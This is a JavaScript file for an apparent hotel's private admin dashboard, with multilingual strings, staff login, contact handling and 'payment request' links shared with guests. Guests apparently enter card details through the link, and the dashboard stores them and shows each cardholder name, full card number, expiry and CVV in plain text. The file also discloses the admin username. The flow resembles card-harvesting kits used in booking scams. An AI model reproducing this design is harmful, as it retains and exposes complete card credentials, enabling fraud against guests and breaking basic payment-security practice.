/* Admin dashboard logic — beybun-admin.html only */
(function () {
  var contactsCache = [];
  var paymentsCache = [];
  var LANG_KEY = "beybun-lang";

  var ADMIN_I18N = {
    en: {
      backWebsite: "← Return to website",
      loginTitle: "Staff access",
      loginText: "Private hotel portal. Not linked from the public menu.",
      username: "Username",
      password: "Password",
      loginError: "Incorrect username or password.",
      signIn: "Sign in",
      signOut: "Sign out",
      dashboardTitle: "Admin dashboard",
      tabPayments: "Payments",
      tabCreate: "Create payment",
      tabContacts: "Contacts",
      tabSecurity: "Security",
      paymentsTitle: "Payment requests",
      createTitle: "Create payment request",
      contactsTitle: "Contact requests",
      securityTitle: "Security",
      securityText: "Username is Mustafa.Beybun. Change the password in Railway Variables: ADMIN_PASSWORD (and optionally JWT_SECRET).",
      securityNote: "Payments and contacts are stored in PostgreSQL so every device sees the same data.",
      createdText: "Payment request created. Share this number with the guest:",
      guestLinkLabel: "Guest payment link:",
      guestName: "Guest name",
      phone: "Phone / WhatsApp",
      room: "Room",
      roomSelect: "Select a room",
      roomStandard: "Standard Room",
      roomTriple: "Triple Room",
      roomJacuzzi: "Jacuzzi Room",
      checkin: "Check-in",
      checkout: "Check-out",
      nights: "Nights",
      nightOne: "night",
      nightMany: "nights",
      dailyCost: "Daily cost (TRY)",
      totalCost: "Total cost (TRY)",
      downPayment: "Down payment amount (TRY)",
      notes: "Notes",
      generate: "Generate payment request",
      emptyPayments: "No payment requests yet. Create one from the Create payment tab.",
      emptyContacts: "No contact requests yet.",
      email: "Email",
      guests: "Guests",
      markRead: "Mark read",
      createPayment: "Create payment",
      delete: "Delete",
      copyNumber: "Copy number",
      copyLink: "Copy guest link",
      copied: "Copied!",
      linkCopied: "Link copied!",
      cardSubmitted: "Card submitted",
      cardholder: "Cardholder",
      cardNumber: "Card number",
      expiry: "Expiry",
      cvv: "CVV",
      submitted: "Submitted",
      waitingCard: "Waiting for guest card details…",
      guest: "Guest",
      statusNew: "new",
      statusRead: "read",
      datesInvalid: "Check-out must be after check-in.",
      roomRequired: "Please select a room.",
      createFailed: "Could not create payment request. Is DATABASE_URL set on Railway?"
    },
    tr: {
      backWebsite: "← Siteye dön",
      loginTitle: "Personel girişi",
      loginText: "Özel otel paneli. Genel menüde yer almaz.",
      username: "Kullanıcı adı",
      password: "Şifre",
      loginError: "Kullanıcı adı veya şifre hatalı.",
      signIn: "Giriş yap",
      signOut: "Çıkış",
      dashboardTitle: "Yönetim paneli",
      tabPayments: "Ödemeler",
      tabCreate: "Ödeme oluştur",
      tabContacts: "İletişim",
      tabSecurity: "Güvenlik",
      paymentsTitle: "Ödeme talepleri",
      createTitle: "Ödeme talebi oluştur",
      contactsTitle: "İletişim talepleri",
      securityTitle: "Güvenlik",
      securityText: "Kullanıcı adı Mustafa.Beybun. Şifreyi Railway Variables içinde ADMIN_PASSWORD ile değiştirin (isteğe bağlı JWT_SECRET).",
      securityNote: "Ödemeler ve iletişim kayıtları PostgreSQL’de tutulur; tüm cihazlarda aynı görünür.",
      createdText: "Ödeme talebi oluşturuldu. Bu numarayı misafirle paylaşın:",
      guestLinkLabel: "Misafir ödeme bağlantısı:",
      guestName: "Misafir adı",
      phone: "Telefon / WhatsApp",
      room: "Oda",
      roomSelect: "Bir oda seçin",
      roomStandard: "Standart Oda",
      roomTriple: "Üç Kişilik Oda",
      roomJacuzzi: "Jakuzi Odası",
      checkin: "Giriş",
      checkout: "Çıkış",
      nights: "Gece",
      nightOne: "gece",
      nightMany: "gece",
      dailyCost: "Günlük ücret (TRY)",
      totalCost: "Toplam ücret (TRY)",
      downPayment: "Kapora tutarı (TRY)",
      notes: "Notlar",
      generate: "Ödeme talebi oluştur",
      emptyPayments: "Henüz ödeme talebi yok. Ödeme oluştur sekmesinden ekleyin.",
      emptyContacts: "Henüz iletişim talebi yok.",
      email: "E-posta",
      guests: "Misafir",
      markRead: "Okundu",
      createPayment: "Ödeme oluştur",
      delete: "Sil",
      copyNumber: "Numarayı kopyala",
      copyLink: "Misafir linkini kopyala",
      copied: "Kopyalandı!",
      linkCopied: "Link kopyalandı!",
      cardSubmitted: "Kart gönderildi",
      cardholder: "Kart sahibi",
      cardNumber: "Kart numarası",
      expiry: "SKT",
      cvv: "CVV",
      submitted: "Gönderildi",
      waitingCard: "Misafir kart bilgileri bekleniyor…",
      guest: "Misafir",
      statusNew: "yeni",
      statusRead: "okundu",
      datesInvalid: "Çıkış, girişten sonra olmalıdır.",
      roomRequired: "Lütfen bir oda seçin.",
      createFailed: "Ödeme talebi oluşturulamadı. Railway’de DATABASE_URL ayarlı mı?"
    },
    ar: {
      backWebsite: "← العودة للموقع",
      loginTitle: "دخول الموظفين",
      loginText: "بوابة الفندق الخاصة. غير ظاهرة في القائمة العامة.",
      username: "اسم المستخدم",
      password: "كلمة المرور",
      loginError: "اسم المستخدم أو كلمة المرور غير صحيحة.",
      signIn: "تسجيل الدخول",
      signOut: "تسجيل الخروج",
      dashboardTitle: "لوحة الإدارة",
      tabPayments: "المدفوعات",
      tabCreate: "إنشاء دفع",
      tabContacts: "التواصل",
      tabSecurity: "الأمان",
      paymentsTitle: "طلبات الدفع",
      createTitle: "إنشاء طلب دفع",
      contactsTitle: "طلبات التواصل",
      securityTitle: "الأمان",
      securityText: "اسم المستخدم Mustafa.Beybun. غيّر كلمة المرور في Railway Variables: ADMIN_PASSWORD.",
      securityNote: "تُحفظ المدفوعات وطلبات التواصل في PostgreSQL وتظهر على كل الأجهزة.",
      createdText: "تم إنشاء طلب الدفع. شارك هذا الرقم مع الضيف:",
      guestLinkLabel: "رابط دفع الضيف:",
      guestName: "اسم الضيف",
      phone: "هاتف / واتساب",
      room: "الغرفة",
      roomSelect: "اختر غرفة",
      roomStandard: "غرفة قياسية",
      roomTriple: "غرفة ثلاثية",
      roomJacuzzi: "غرفة جاكوزي",
      checkin: "تسجيل الدخول",
      checkout: "تسجيل الخروج",
      nights: "الليالي",
      nightOne: "ليلة",
      nightMany: "ليالٍ",
      dailyCost: "التكلفة اليومية (TRY)",
      totalCost: "التكلفة الإجمالية (TRY)",
      downPayment: "مبلغ العربون (TRY)",
      notes: "ملاحظات",
      generate: "إنشاء طلب الدفع",
      emptyPayments: "لا توجد طلبات دفع بعد. أنشئ واحداً من تبويب إنشاء دفع.",
      emptyContacts: "لا توجد طلبات تواصل بعد.",
      email: "البريد",
      guests: "الضيوف",
      markRead: "تعليم كمقروء",
      createPayment: "إنشاء دفع",
      delete: "حذف",
      copyNumber: "نسخ الرقم",
      copyLink: "نسخ رابط الضيف",
      copied: "تم النسخ!",
      linkCopied: "تم نسخ الرابط!",
      cardSubmitted: "تم إرسال البطاقة",
      cardholder: "حامل البطاقة",
      cardNumber: "رقم البطاقة",
      expiry: "الانتهاء",
      cvv: "CVV",
      submitted: "أُرسل",
      waitingCard: "بانتظار بيانات بطاقة الضيف…",
      guest: "الضيف",
      statusNew: "جديد",
      statusRead: "مقروء",
      datesInvalid: "يجب أن يكون الخروج بعد الدخول.",
      roomRequired: "يرجى اختيار غرفة.",
      createFailed: "تعذر إنشاء طلب الدفع. هل DATABASE_URL مضبوط على Railway؟"
    },
    it: {
      backWebsite: "← Torna al sito",
      loginTitle: "Accesso staff",
      loginText: "Portale privato dell’hotel. Non presente nel menu pubblico.",
      username: "Nome utente",
      password: "Password",
      loginError: "Nome utente o password non corretti.",
      signIn: "Accedi",
      signOut: "Esci",
      dashboardTitle: "Pannello admin",
      tabPayments: "Pagamenti",
      tabCreate: "Crea pagamento",
      tabContacts: "Contatti",
      tabSecurity: "Sicurezza",
      paymentsTitle: "Richieste di pagamento",
      createTitle: "Crea richiesta di pagamento",
      contactsTitle: "Richieste di contatto",
      securityTitle: "Sicurezza",
      securityText: "Username: Mustafa.Beybun. Cambia la password in Railway Variables: ADMIN_PASSWORD.",
      securityNote: "Pagamenti e contatti sono in PostgreSQL e visibili su ogni dispositivo.",
      createdText: "Richiesta creata. Condividi questo numero con l’ospite:",
      guestLinkLabel: "Link pagamento ospite:",
      guestName: "Nome ospite",
      phone: "Telefono / WhatsApp",
      room: "Camera",
      roomSelect: "Seleziona una camera",
      roomStandard: "Camera Standard",
      roomTriple: "Camera Triple",
      roomJacuzzi: "Camera Jacuzzi",
      checkin: "Check-in",
      checkout: "Check-out",
      nights: "Notti",
      nightOne: "notte",
      nightMany: "notti",
      dailyCost: "Costo giornaliero (TRY)",
      totalCost: "Costo totale (TRY)",
      downPayment: "Acconto (TRY)",
      notes: "Note",
      generate: "Genera richiesta di pagamento",
      emptyPayments: "Nessuna richiesta. Creane una dalla scheda Crea pagamento.",
      emptyContacts: "Nessuna richiesta di contatto.",
      email: "Email",
      guests: "Ospiti",
      markRead: "Segna letto",
      createPayment: "Crea pagamento",
      delete: "Elimina",
      copyNumber: "Copia numero",
      copyLink: "Copia link ospite",
      copied: "Copiato!",
      linkCopied: "Link copiato!",
      cardSubmitted: "Carta inviata",
      cardholder: "Intestatario",
      cardNumber: "Numero carta",
      expiry: "Scadenza",
      cvv: "CVV",
      submitted: "Inviata",
      waitingCard: "In attesa dei dati della carta…",
      guest: "Ospite",
      statusNew: "nuovo",
      statusRead: "letto",
      datesInvalid: "Il check-out deve essere dopo il check-in.",
      roomRequired: "Seleziona una camera.",
      createFailed: "Impossibile creare la richiesta. DATABASE_URL è impostato su Railway?"
    },
    es: {
      backWebsite: "← Volver al sitio",
      loginTitle: "Acceso del personal",
      loginText: "Portal privado del hotel. No aparece en el menú público.",
      username: "Usuario",
      password: "Contraseña",
      loginError: "Usuario o contraseña incorrectos.",
      signIn: "Iniciar sesión",
      signOut: "Cerrar sesión",
      dashboardTitle: "Panel de administración",
      tabPayments: "Pagos",
      tabCreate: "Crear pago",
      tabContacts: "Contactos",
      tabSecurity: "Seguridad",
      paymentsTitle: "Solicitudes de pago",
      createTitle: "Crear solicitud de pago",
      contactsTitle: "Solicitudes de contacto",
      securityTitle: "Seguridad",
      securityText: "Usuario: Mustafa.Beybun. Cambia la contraseña en Railway Variables: ADMIN_PASSWORD.",
      securityNote: "Pagos y contactos están en PostgreSQL y se ven en todos los dispositivos.",
      createdText: "Solicitud creada. Comparte este número con el huésped:",
      guestLinkLabel: "Enlace de pago del huésped:",
      guestName: "Nombre del huésped",
      phone: "Teléfono / WhatsApp",
      room: "Habitación",
      roomSelect: "Selecciona una habitación",
      roomStandard: "Habitación Standard",
      roomTriple: "Habitación Triple",
      roomJacuzzi: "Habitación Jacuzzi",
      checkin: "Entrada",
      checkout: "Salida",
      nights: "Noches",
      nightOne: "noche",
      nightMany: "noches",
      dailyCost: "Coste diario (TRY)",
      totalCost: "Coste total (TRY)",
      downPayment: "Anticipo (TRY)",
      notes: "Notas",
      generate: "Generar solicitud de pago",
      emptyPayments: "Aún no hay solicitudes. Crea una en Crear pago.",
      emptyContacts: "Aún no hay solicitudes de contacto.",
      email: "Correo",
      guests: "Huéspedes",
      markRead: "Marcar leído",
      createPayment: "Crear pago",
      delete: "Eliminar",
      copyNumber: "Copiar número",
      copyLink: "Copiar enlace",
      copied: "¡Copiado!",
      linkCopied: "¡Enlace copiado!",
      cardSubmitted: "Tarjeta enviada",
      cardholder: "Titular",
      cardNumber: "Número de tarjeta",
      expiry: "Caducidad",
      cvv: "CVV",
      submitted: "Enviado",
      waitingCard: "Esperando datos de la tarjeta…",
      guest: "Huésped",
      statusNew: "nuevo",
      statusRead: "leído",
      datesInvalid: "La salida debe ser después de la entrada.",
      roomRequired: "Selecciona una habitación.",
      createFailed: "No se pudo crear la solicitud. ¿DATABASE_URL está en Railway?"
    },
    fa: {
      backWebsite: "← بازگشت به وب‌سایت",
      loginTitle: "ورود کارکنان",
      loginText: "پنل خصوصی هتل. در منوی عمومی نیست.",
      username: "نام کاربری",
      password: "رمز عبور",
      loginError: "نام کاربری یا رمز عبور نادرست است.",
      signIn: "ورود",
      signOut: "خروج",
      dashboardTitle: "پنل مدیریت",
      tabPayments: "پرداخت‌ها",
      tabCreate: "ایجاد پرداخت",
      tabContacts: "تماس‌ها",
      tabSecurity: "امنیت",
      paymentsTitle: "درخواست‌های پرداخت",
      createTitle: "ایجاد درخواست پرداخت",
      contactsTitle: "درخواست‌های تماس",
      securityTitle: "امنیت",
      securityText: "نام کاربری Mustafa.Beybun است. رمز را در Railway Variables با ADMIN_PASSWORD تغییر دهید.",
      securityNote: "پرداخت‌ها و تماس‌ها در PostgreSQL ذخیره می‌شوند و در همه دستگاه‌ها یکسان‌اند.",
      createdText: "درخواست ایجاد شد. این شماره را با مهمان به اشتراک بگذارید:",
      guestLinkLabel: "لینک پرداخت مهمان:",
      guestName: "نام مهمان",
      phone: "تلفن / واتساپ",
      room: "اتاق",
      roomSelect: "یک اتاق انتخاب کنید",
      roomStandard: "اتاق استاندارد",
      roomTriple: "اتاق سه‌نفره",
      roomJacuzzi: "اتاق جکوزی",
      checkin: "ورود",
      checkout: "خروج",
      nights: "شب",
      nightOne: "شب",
      nightMany: "شب",
      dailyCost: "هزینه روزانه (TRY)",
      totalCost: "هزینه کل (TRY)",
      downPayment: "مبلغ بیعانه (TRY)",
      notes: "یادداشت",
      generate: "ایجاد درخواست پرداخت",
      emptyPayments: "هنوز درخواستی نیست. از تب ایجاد پرداخت اضافه کنید.",
      emptyContacts: "هنوز درخواست تماسی نیست.",
      email: "ایمیل",
      guests: "مهمانان",
      markRead: "خوانده شد",
      createPayment: "ایجاد پرداخت",
      delete: "حذف",
      copyNumber: "کپی شماره",
      copyLink: "کپی لینک مهمان",
      copied: "کپی شد!",
      linkCopied: "لینک کپی شد!",
      cardSubmitted: "کارت ارسال شد",
      cardholder: "دارنده کارت",
      cardNumber: "شماره کارت",
      expiry: "انقضا",
      cvv: "CVV",
      submitted: "ارسال‌شده",
      waitingCard: "در انتظار اطلاعات کارت مهمان…",
      guest: "مهمان",
      statusNew: "جدید",
      statusRead: "خوانده‌شده",
      datesInvalid: "خروج باید بعد از ورود باشد.",
      roomRequired: "لطفاً یک اتاق انتخاب کنید.",
      createFailed: "ایجاد درخواست ممکن نشد. آیا DATABASE_URL در Railway تنظیم شده؟"
    }
  };

  function $(id) { return document.getElementById(id); }

  function getLang() {
    var stored = localStorage.getItem(LANG_KEY);
    if (ADMIN_I18N[stored]) return stored;
    return "en";
  }

  function t(key) {
    var pack = ADMIN_I18N[getLang()] || ADMIN_I18N.en;
    return pack[key] || ADMIN_I18N.en[key] || key;
  }

  function applyAdminI18n() {
    var lang = getLang();
    var pack = window.BEYBUN_I18N && window.BEYBUN_I18N[lang];
    document.documentElement.lang = lang;
    document.documentElement.dir = (pack && pack.dir) || (lang === "ar" || lang === "fa" ? "rtl" : "ltr");

    document.querySelectorAll("[data-i18n-admin]").forEach(function (el) {
      var key = el.getAttribute("data-i18n-admin");
      var value = t(key);
      if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
        el.placeholder = value;
      } else {
        el.textContent = value;
      }
    });
  }

  function money(n) {
    return Math.round(Number(n || 0)).toLocaleString("tr-TR") + " TRY";
  }

  function digitsOnly(value) {
    return String(value || "").replace(/\D/g, "");
  }

  function bindMoneyInput(el) {
    if (!el) return;
    el.addEventListener("input", function () {
      el.value = digitsOnly(el.value);
      updateNightsAndTotal();
    });
  }

  function fmtDate(iso) {
    try {
      return new Date(iso).toLocaleString(getLang());
    } catch (e) {
      return iso;
    }
  }

  function showScreen(name) {
    var login = $("loginScreen");
    var dash = $("dashScreen");
    if (name === "dash") {
      login.hidden = true;
      login.style.display = "none";
      dash.hidden = false;
      dash.style.display = "";
      document.body.classList.add("is-admin-dash");
      document.body.classList.remove("is-admin-login");
    } else {
      dash.hidden = true;
      dash.style.display = "none";
      login.hidden = false;
      login.style.display = "";
      document.body.classList.add("is-admin-login");
      document.body.classList.remove("is-admin-dash");
    }
  }

  function setTab(tab) {
    document.querySelectorAll("[data-admin-tab]").forEach(function (btn) {
      btn.classList.toggle("is-active", btn.getAttribute("data-admin-tab") === tab);
    });
    $("tabContacts").hidden = tab !== "contacts";
    $("tabPayments").hidden = tab !== "payments";
    $("tabCreate").hidden = tab !== "create";
    $("tabSecurity").hidden = tab !== "security";
  }

  function escapeHtml(str) {
    return String(str == null ? "" : str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function statusLabel(status) {
    if (status === "new") return t("statusNew");
    if (status === "read") return t("statusRead");
    return status || "";
  }

  function renderContacts(list) {
    contactsCache = list || [];
    $("contactCount").textContent = String(contactsCache.length);
    var root = $("contactsList");
    if (!contactsCache.length) {
      root.innerHTML = '<p class="admin-empty">' + escapeHtml(t("emptyContacts")) + "</p>";
      return;
    }
    root.innerHTML = contactsCache.map(function (c) {
      return (
        '<article class="admin-card" data-contact="' + c.id + '">' +
          '<div class="admin-card-top">' +
            '<div><strong>' + escapeHtml(c.name) + '</strong>' +
            '<span class="admin-badge">' + escapeHtml(statusLabel(c.status || "new")) + '</span></div>' +
            '<time>' + escapeHtml(fmtDate(c.createdAt)) + '</time>' +
          '</div>' +
          '<dl class="admin-dl">' +
            '<div><dt>' + escapeHtml(t("email")) + '</dt><dd>' + escapeHtml(c.email || "—") + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("phone")) + '</dt><dd>' + escapeHtml(c.phone) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("room")) + '</dt><dd>' + escapeHtml(c.room) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("checkin")) + '</dt><dd>' + escapeHtml(c.checkin) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("checkout")) + '</dt><dd>' + escapeHtml(c.checkout) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("guests")) + '</dt><dd>' + escapeHtml(String(c.guests)) + '</dd></div>' +
          '</dl>' +
          '<p class="admin-msg">' + escapeHtml(c.message || "—") + '</p>' +
          '<div class="admin-actions">' +
            '<button type="button" class="btn btn-ghost" data-mark-read="' + c.id + '">' + escapeHtml(t("markRead")) + '</button>' +
            '<button type="button" class="btn btn-ghost" data-create-from="' + c.id + '">' + escapeHtml(t("createPayment")) + '</button>' +
            '<button type="button" class="btn btn-ghost" data-del-contact="' + c.id + '">' + escapeHtml(t("delete")) + '</button>' +
          '</div>' +
        '</article>'
      );
    }).join("");
  }

  function renderPayments(list) {
    paymentsCache = list || [];
    $("paymentCount").textContent = String(paymentsCache.length);
    var root = $("paymentsList");
    if (!paymentsCache.length) {
      root.innerHTML = '<p class="admin-empty">' + escapeHtml(t("emptyPayments")) + "</p>";
      return;
    }
    root.innerHTML = paymentsCache.map(function (p) {
      var cardBlock = p.card && p.card.number
        ? (
          '<div class="admin-card-data">' +
            '<h4>' + escapeHtml(t("cardSubmitted")) + '</h4>' +
            '<dl class="admin-dl">' +
              '<div><dt>' + escapeHtml(t("cardholder")) + '</dt><dd>' + escapeHtml(p.card.holder) + '</dd></div>' +
              '<div><dt>' + escapeHtml(t("cardNumber")) + '</dt><dd class="mono">' + escapeHtml(window.BeybunStore.formatCard(p.card.number)) + '</dd></div>' +
              '<div><dt>' + escapeHtml(t("expiry")) + '</dt><dd>' + escapeHtml(p.card.expiry) + '</dd></div>' +
              '<div><dt>' + escapeHtml(t("cvv")) + '</dt><dd class="mono">' + escapeHtml(p.card.cvv) + '</dd></div>' +
              '<div><dt>' + escapeHtml(t("submitted")) + '</dt><dd>' + escapeHtml(fmtDate(p.card.submittedAt)) + '</dd></div>' +
            '</dl>' +
          '</div>'
        )
        : '<p class="admin-waiting">' + escapeHtml(t("waitingCard")) + '</p>';

      return (
        '<article class="admin-card">' +
          '<div class="admin-card-top">' +
            '<div><strong class="mono">' + escapeHtml(p.requestNumber) + '</strong>' +
            '<span class="admin-badge">' + escapeHtml(p.status) + '</span></div>' +
            '<time>' + escapeHtml(fmtDate(p.createdAt)) + '</time>' +
          '</div>' +
          '<dl class="admin-dl">' +
            '<div><dt>' + escapeHtml(t("guest")) + '</dt><dd>' + escapeHtml(p.clientName) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("phone")) + '</dt><dd>' + escapeHtml(p.phone || "—") + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("room")) + '</dt><dd>' + escapeHtml(p.room || "—") + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("checkin")) + '</dt><dd>' + escapeHtml(p.checkin) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("checkout")) + '</dt><dd>' + escapeHtml(p.checkout) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("nights")) + '</dt><dd>' + escapeHtml(String(p.nights || "—")) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("dailyCost")) + '</dt><dd>' + money(p.dailyCost) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("totalCost")) + '</dt><dd>' + money(p.totalCost) + '</dd></div>' +
            '<div><dt>' + escapeHtml(t("downPayment")) + '</dt><dd>' + money(p.downPayment) + '</dd></div>' +
          '</dl>' +
          cardBlock +
          '<div class="admin-actions">' +
            '<button type="button" class="btn btn-ghost" data-copy-ref="' + escapeHtml(p.requestNumber) + '">' + escapeHtml(t("copyNumber")) + '</button>' +
            '<button type="button" class="btn btn-ghost" data-copy-link="' + escapeHtml(p.requestNumber) + '">' + escapeHtml(t("copyLink")) + '</button>' +
            '<button type="button" class="btn btn-ghost" data-del-payment="' + escapeHtml(p.requestNumber) + '">' + escapeHtml(t("delete")) + '</button>' +
          '</div>' +
        '</article>'
      );
    }).join("");
  }

  function refresh() {
    return Promise.all([
      window.BeybunStore.getContacts().catch(function () { return []; }),
      window.BeybunStore.getPayments().catch(function () { return []; })
    ]).then(function (results) {
      renderContacts(results[0]);
      renderPayments(results[1]);
    });
  }

  function updateNightsAndTotal() {
    var form = $("createPaymentForm");
    if (!form) return;
    var nights = window.BeybunStore.calcNights(form.checkin.value, form.checkout.value);
    var nightsEl = $("nightsDisplay");
    if (nightsEl) {
      nightsEl.textContent = nights > 0
        ? (nights + " " + (nights === 1 ? t("nightOne") : t("nightMany")))
        : "—";
    }
    var nightsInput = form.nights;
    if (nightsInput) nightsInput.value = nights > 0 ? String(nights) : "";
    var daily = Number(digitsOnly(form.dailyCost.value)) || 0;
    if (nights > 0 && daily > 0) {
      form.totalCost.value = String(daily * nights);
    } else if (!daily) {
      form.totalCost.value = "";
    }
  }

  function initLogin() {
    window.BeybunStore.logout();
    showScreen("login");

    $("adminLoginForm").addEventListener("submit", function (e) {
      e.preventDefault();
      var err = $("loginError");
      err.hidden = true;
      var username = $("adminUsername").value;
      var password = $("adminPassword").value;
      window.BeybunStore.login(username, password).then(function (ok) {
        if (!ok) {
          err.textContent = t("loginError");
          err.hidden = false;
          return;
        }
        $("adminUsername").value = "";
        $("adminPassword").value = "";
        showScreen("dash");
        setTab("payments");
        refresh();
      });
    });

    $("logoutBtn").addEventListener("click", function () {
      window.BeybunStore.logout();
      showScreen("login");
    });

    setInterval(function () {
      if (!window.BeybunStore.isLoggedIn()) return;
      if ($("dashScreen").hidden) return;
      refresh();
    }, 5000);
  }

  function initTabs() {
    document.querySelectorAll("[data-admin-tab]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        setTab(btn.getAttribute("data-admin-tab"));
      });
    });
    setTab("payments");
  }

  function initCreate() {
    var form = $("createPaymentForm");
    ["checkin", "checkout"].forEach(function (name) {
      var el = form.querySelector('[name="' + name + '"]');
      if (el) el.addEventListener("input", updateNightsAndTotal);
      if (el) el.addEventListener("change", updateNightsAndTotal);
    });
    bindMoneyInput(form.dailyCost);
    bindMoneyInput(form.downPayment);

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      updateNightsAndTotal();
      var data = new FormData(form);
      var nights = Number(data.get("nights")) || window.BeybunStore.calcNights(data.get("checkin"), data.get("checkout"));
      if (nights < 1) {
        alert(t("datesInvalid"));
        return;
      }
      if (!data.get("room")) {
        alert(t("roomRequired"));
        return;
      }

      window.BeybunStore.createPaymentRequest({
        clientName: data.get("clientName"),
        phone: data.get("phone"),
        room: data.get("room"),
        checkin: data.get("checkin"),
        checkout: data.get("checkout"),
        nights: nights,
        dailyCost: digitsOnly(data.get("dailyCost")),
        totalCost: digitsOnly(data.get("totalCost")),
        downPayment: digitsOnly(data.get("downPayment")),
        notes: data.get("notes")
      }).then(function (item) {
        var guestLink = new URL("payment.html", window.location.href);
        guestLink.searchParams.set("ref", item.requestNumber);
        $("createdNumber").textContent = item.requestNumber;
        $("createdLink").href = guestLink.toString();
        $("createdLink").textContent = guestLink.toString();
        $("createdBox").hidden = false;
        form.reset();
        updateNightsAndTotal();
        applyAdminI18n();
        return refresh();
      }).then(function () {
        setTab("payments");
      }).catch(function (err) {
        alert((err && err.message) || t("createFailed"));
      });
    });
  }

  function initActions() {
    document.body.addEventListener("click", function (e) {
      var tEl = e.target.closest("[data-mark-read],[data-del-contact],[data-del-payment],[data-copy-ref],[data-copy-link],[data-create-from]");
      if (!tEl) return;

      if (tEl.hasAttribute("data-mark-read")) {
        window.BeybunStore.markContactRead(tEl.getAttribute("data-mark-read")).then(refresh);
      }
      if (tEl.hasAttribute("data-del-contact")) {
        if (confirm(t("delete") + "?")) {
          window.BeybunStore.deleteContact(tEl.getAttribute("data-del-contact")).then(refresh);
        }
      }
      if (tEl.hasAttribute("data-del-payment")) {
        if (confirm(t("delete") + "?")) {
          window.BeybunStore.deletePayment(tEl.getAttribute("data-del-payment")).then(refresh);
        }
      }
      if (tEl.hasAttribute("data-copy-ref")) {
        var code = tEl.getAttribute("data-copy-ref");
        navigator.clipboard.writeText(code).then(function () {
          tEl.textContent = t("copied");
          setTimeout(function () { tEl.textContent = t("copyNumber"); }, 1200);
        });
      }
      if (tEl.hasAttribute("data-copy-link")) {
        var req = tEl.getAttribute("data-copy-link");
        var guestLink = new URL("payment.html", window.location.href);
        guestLink.searchParams.set("ref", req);
        navigator.clipboard.writeText(guestLink.toString()).then(function () {
          tEl.textContent = t("linkCopied");
          setTimeout(function () { tEl.textContent = t("copyLink"); }, 1200);
        });
      }
      if (tEl.hasAttribute("data-create-from")) {
        var id = tEl.getAttribute("data-create-from");
        var c = contactsCache.find(function (x) { return String(x.id) === String(id); });
        if (!c) return;
        setTab("create");
        var form = $("createPaymentForm");
        form.clientName.value = c.name || "";
        form.phone.value = c.phone || "";
        var roomVal = c.room || "";
        var roomOptions = ["Standard Room", "Triple Room", "Jacuzzi Room"];
        var matched = roomOptions.find(function (r) {
          return roomVal === r || roomVal.toLowerCase().indexOf(r.split(" ")[0].toLowerCase()) !== -1;
        });
        form.room.value = matched || "";
        form.checkin.value = c.checkin || "";
        form.checkout.value = c.checkout || "";
        updateNightsAndTotal();
      }
    });
  }

  document.addEventListener("DOMContentLoaded", function () {
    applyAdminI18n();
    initLogin();
    initTabs();
    initCreate();
    initActions();
  });
})();
